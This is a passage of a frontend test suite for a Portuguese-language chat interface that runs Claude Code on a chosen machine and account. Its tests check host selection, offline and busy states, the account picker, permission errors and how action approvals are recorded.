  // First read: nothing chosen. Every read after the choice sees the host the server now has.
  chatMock.mockResolvedValueOnce(conversationWith({ kind: 'not_chosen', machines: [{ id: 'm1', name: 'macbook' }, { id: 'm2', name: 'jarvis' }], sessionAtStake: false })).mockResolvedValue(conversationWith(ready));
  setHostMock.mockResolvedValue({ conversation: { id: 'c1' }, host: ready });
  renderChat();

  fireEvent.click(await screen.findByRole('button', { name: 'jarvis' }));

  // The pair travels in one call, and a machine change carries no account: a login belongs to a
  // machine, so the new host starts on its own default one.
  await waitFor(() => expect(setHostMock).toHaveBeenCalledWith('m2', null));
  expect(await screen.findByText(/máquina jarvis/i)).toBeTruthy();
  // The transcript is ours and survives a fresh CLI session: the conversation is read again.
  await waitFor(() => expect(chatMock.mock.calls.length).toBeGreaterThanOrEqual(2));
  expect(screen.queryByText(/escolha em qual/i)).toBeNull();
});

it('says which machine and which account are running the conversation', async () => {
  chatMock.mockResolvedValue(conversationWith({ kind: 'ready', machine: { id: 'm1', name: 'jarvis' }, configDir: '/home/u/.claude-work', account: { kind: 'chosen', id: 'acc1', label: 'trabalho' } }));
  renderChat();

  expect(await screen.findByText(/máquina jarvis/i)).toBeTruthy();
  expect(screen.getByText(/conta trabalho/i)).toBeTruthy();
  expect((screen.getByRole('button', { name: /enviar/i }) as HTMLButtonElement).disabled).toBe(true); // empty box, not a blocked host
  expect(screen.queryByText(/cadastre uma máquina/i)).toBeNull();
});

it('an offline host reads as the machine being off, and the composer says that is why', async () => {
  chatMock.mockResolvedValue(conversationWith({ kind: 'offline', machine: { id: 'm2', name: 'jarvis' } }));
  renderChat();

  expect(await screen.findByText(/máquina jarvis está offline/i)).toBeTruthy();
  expect(screen.getByText(/a máquina do chat está offline/i)).toBeTruthy(); // the composer's own reason
});

it('loads the machines only when the host change is asked for, and offers the agent ones', async () => {
  chatMock.mockResolvedValue(conversationWith({ kind: 'offline', machine: { id: 'm2', name: 'jarvis' } }));
  machinesMock.mockResolvedValue({
    machines: [
      { id: 'm1', name: 'macbook', type: 'agent', owner_id: 'u1' },
      { id: 'm2', name: 'jarvis', type: 'agent', owner_id: 'u1' },
      // The server's own computer cannot host a conversation, so it is never offered.
      { id: 'm3', name: 'servidor', type: 'local', owner_id: 'u1' },
      // Someone else's machine, which `GET /machines` returns to an admin viewing "all" and
      // `POST /chat/host` answers 404 for: offering it would be offering a dead end.
      { id: 'm9', name: 'da-ana', type: 'agent', owner_id: 'u2' },
    ],
    latest_agent_version: null,
  });
  renderChat();

  await screen.findByText(/máquina jarvis está offline/i);
  expect(machinesMock).not.toHaveBeenCalled();

  fireEvent.click(screen.getByRole('button', { name: /trocar máquina/i }));

  expect(await screen.findByRole('button', { name: /trocar para macbook/i })).toBeTruthy();
  expect(screen.queryByRole('button', { name: /trocar para servidor/i })).toBeNull();
  expect(screen.queryByRole('button', { name: /trocar para da-ana/i })).toBeNull();
  // The warning comes before the change, and nothing was set by opening the picker.
  expect(screen.getByText(/memória do modelo começa de novo/i)).toBeTruthy();
  expect(setHostMock).not.toHaveBeenCalled();

  fireEvent.click(screen.getByRole('button', { name: /trocar para macbook/i }));
  await waitFor(() => expect(setHostMock).toHaveBeenCalledWith('m1', null));
});

it('sends the account with the machine, so the chat can actually run on a chosen login', async () => {
  const ready = { kind: 'ready', machine: { id: 'm1', name: 'macbook' }, configDir: null, account: { kind: 'default' } };
  const chosen = { kind: 'ready', machine: { id: 'm1', name: 'macbook' }, configDir: '/home/u/.claude-work', account: { kind: 'chosen', id: 'acc1', label: 'trabalho' } };
  const conv = (aiAccountId: string | null) => ({ conversation: { id: 'c1', title: null, model: null, review_mode: false, ai_account_id: aiAccountId, last_message_at: null } });
  // The first read has no account chosen; every read after the pick sees the pair the server now has.
  chatMock.mockResolvedValueOnce(conversationWith(ready, conv(null))).mockResolvedValue(conversationWith(chosen, conv('acc1')));
  machinesMock.mockResolvedValue({ machines: [{ id: 'm1', name: 'macbook', type: 'agent', owner_id: 'u1' }], latest_agent_version: null });
  accountsMock.mockResolvedValue({
    accounts: [
      { id: 'acc1', label: 'trabalho', provider: 'claude', machine_id: 'm1', config_dir: '/home/u/.claude-work' },
      // The chat runs on Claude, and a login of another machine names a config dir that does not
      // exist on this one — which is the 404 `POST /chat/host` answers for it.
      { id: 'acc2', label: 'gpt', provider: 'chatgpt', machine_id: 'm1', config_dir: null },
      { id: 'acc3', label: 'outra máquina', provider: 'claude', machine_id: 'm2', config_dir: null },
    ],
  });
  setHostMock.mockResolvedValue({ conversation: { id: 'c1', ai_account_id: 'acc1' }, host: chosen });
  renderChat();

  fireEvent.click(await screen.findByRole('button', { name: /trocar máquina/i }));

  expect(await screen.findByRole('button', { name: /trocar para trabalho/i })).toBeTruthy();
  expect(screen.queryByRole('button', { name: /trocar para gpt/i })).toBeNull();
  expect(screen.queryByRole('button', { name: /trocar para outra máquina/i })).toBeNull();

  fireEvent.click(screen.getByRole('button', { name: /trocar para trabalho/i }));

  // The pair in one call: the account the person picked, on the machine that already hosts the
  // conversation. Nothing in the product sent this before, so `chosen` and `lost` were unreachable.
  await waitFor(() => expect(setHostMock).toHaveBeenCalledWith('m1', 'acc1'));
  // …and the header now names it: the `chosen` state is reachable through the product, not only in
  // the server's type.
  expect(await screen.findByText(/conta trabalho/i)).toBeTruthy();
});

it('under “ver como” says how to make the host changeable, instead of showing empty lists', async () => {
  // An admin viewing another user: every list the API answers is that user's, while the conversation is
  // the admin's own. Reporting an empty pair would be a claim about machines they really do have.
  auth.state = { user: { id: 'u1' }, viewAs: { id: 'u2', name: 'Ana', email: 'ana@test', avatar_url: null } };
  chatMock.mockResolvedValue(conversationWith({ kind: 'offline', machine: { id: 'm2', name: 'jarvis' } }));
  machinesMock.mockResolvedValue({ machines: [{ id: 'm9', name: 'da-ana', type: 'agent', owner_id: 'u2' }], latest_agent_version: null });
  renderChat();

  fireEvent.click(await screen.findByRole('button', { name: /trocar máquina/i }));

  expect(await screen.findByText(/saia de “ver como”/i)).toBeTruthy();
  expect(screen.queryByText(/nenhuma outra máquina/i)).toBeNull();
  expect(screen.queryByRole('button', { name: /trocar para/i })).toBeNull();
});

it('keeps the machine picker when the accounts cannot be read at all', async () => {
  chatMock.mockResolvedValue(conversationWith({ kind: 'offline', machine: { id: 'm2', name: 'jarvis' } }));
  machinesMock.mockResolvedValue({
    machines: [
      { id: 'm1', name: 'macbook', type: 'agent', owner_id: 'u1' },
      { id: 'm2', name: 'jarvis', type: 'agent', owner_id: 'u1' },
    ],
    latest_agent_version: null,
  });
  // `ai_accounts` is a resource of its own in the permission matrix: a role that may change the chat's
  // machine can still be refused this read, and the host is offline — this picker is the only way out.
  accountsMock.mockRejectedValueOnce(new Error('sem permissão'));
  setHostMock.mockResolvedValue({ conversation: { id: 'c1', ai_account_id: null }, host: { kind: 'ready', machine: { id: 'm1', name: 'macbook' }, configDir: null, account: { kind: 'default' }, sessionAtStake: false } });
  renderChat();

  fireEvent.click(await screen.findByRole('button', { name: /trocar máquina/i }));

  // The picker stays open, the machines are offered, and the half that failed says so.
  expect(await screen.findByRole('button', { name: /trocar para macbook/i })).toBeTruthy();
  expect(screen.getByText(/não foi possível ler as contas de IA/i)).toBeTruthy();
  expect(screen.queryByText(/não foi possível ler as suas máquinas/i)).toBeNull();

  fireEvent.click(screen.getByRole('button', { name: /trocar para macbook/i }));
  await waitFor(() => expect(setHostMock).toHaveBeenCalledWith('m1', null));
});

it('closes the picker with the reason when the machines could not be read', async () => {
  chatMock.mockResolvedValue(conversationWith({ kind: 'offline', machine: { id: 'm2', name: 'jarvis' } }));
  machinesMock.mockRejectedValueOnce(new Error('rede caiu'));
  renderChat();

  fireEvent.click(await screen.findByRole('button', { name: /trocar máquina/i }));

  expect(await screen.findByText(/não foi possível ler as suas máquinas/i)).toBeTruthy();
  // Never a picker left saying "loading" over a list that will never arrive.
  expect(screen.queryByText(/carregando suas máquinas/i)).toBeNull();
});

it('shows the server refusal when the host could not be set', async () => {
  const { ApiError } = await import('../lib/api');
  chatMock.mockResolvedValue(conversationWith({ kind: 'not_chosen', machines: [{ id: 'm1', name: 'macbook' }], sessionAtStake: false }));
  setHostMock.mockRejectedValueOnce(new ApiError(404, 'Máquina não encontrada', 'NOT_FOUND'));
  renderChat();

  fireEvent.click(await screen.findByRole('button', { name: 'macbook' }));

  expect(await screen.findByText(/máquina não encontrada/i)).toBeTruthy();
});

it('a decision answered while the machine is off is kept, not lost', async () => {
  const { ApiError } = await import('../lib/api');
  const offline = { kind: 'offline', machine: { id: 'm2', name: 'jarvis' } };
  // The second read is held open on purpose: what the card shows in between is what this test is about
  // — the click must already read as answered, before any refetch can confirm it.
  let confirmRead: (value: unknown) => void = () => {};
  chatMock.mockResolvedValueOnce(conversationWith(offline, { actions: [action({ id: 'act1' })] })).mockImplementationOnce(() => new Promise((r) => (confirmRead = r)));
  // The row is already decided server-side before this 409 is thrown: the click was not lost.
  decideMock.mockRejectedValueOnce(new ApiError(409, 'A máquina jarvis está offline. Ligue-a ou escolha outra máquina para o chat.', 'CHAT_HOST_OFFLINE'));
  renderChat();

  fireEvent.click(await screen.findByRole('button', { name: /autorizar/i }));

  expect(await screen.findByText(/já está registrada/i)).toBeTruthy();
  expect(screen.getByText(/máquina jarvis está offline\./i)).toBeTruthy(); // the server's own sentence
  expect(screen.getByText(/autorizado/i)).toBeTruthy(); // the card shows the answer that was given
  expect(screen.queryByText(/não foi possível registrar/i)).toBeNull(); // never a failure of the click

  // …and the read that follows keeps it that way, with the decision the server really has.
  confirmRead(conversationWith(offline, { actions: [action({ id: 'act1', status: 'approved' })] }));
  await waitFor(() => expect(screen.getByText(/autorizado/i)).toBeTruthy());
  expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull();
});

it('says the machine has no Claude Code installed, instead of one generic line for nine failures', async () => {
  chatMock.mockResolvedValue(
    conversationWith({ kind: 'ready', machine: { id: 'm1', name: 'jarvis' }, configDir: null, account: { kind: 'default' } }, { messages: [msg({ id: 'm1', role: 'assistant', text: '', error_code: 'CLI_MISSING' })] }),
  );
  renderChat();

  expect(await screen.findByText(/não tem o Claude Code instalado/i)).toBeTruthy();
  expect(screen.queryByText(/a resposta não terminou/i)).toBeNull();
});

it('says a full machine is full, never that it went away', async () => {
  chatMock.mockResolvedValue(
    conversationWith({ kind: 'ready', machine: { id: 'm1', name: 'jarvis' }, configDir: null, account: { kind: 'default' } }, { messages: [msg({ id: 'm1', role: 'assistant', text: '', error_code: 'HOST_BUSY' })] }),
  );
  renderChat();

  // The machine is up: the run simply had no channel to start on (64 terminals open). Telling the
  // person their healthy machine "saiu do ar" sends them looking for a problem that is not there.
  expect(await screen.findByText(/terminais demais abertos/i)).toBeTruthy();
  expect(screen.queryByText(/saiu do ar/i)).toBeNull();
  expect(screen.queryByText(/a resposta não terminou/i)).toBeNull();
});

it('keeps the generic line for a failure with nothing said about why', async () => {
  chatMock.mockResolvedValue(
    conversationWith({ kind: 'ready', machine: { id: 'm1', name: 'jarvis' }, configDir: null, account: { kind: 'default' } }, { messages: [msg({ id: 'm1', role: 'assistant', text: 'comecei', error_code: 'RUNNER_FAILED' })] }),
  );
  renderChat();

  expect(await screen.findByText(/a resposta não terminou/i)).toBeTruthy();
});
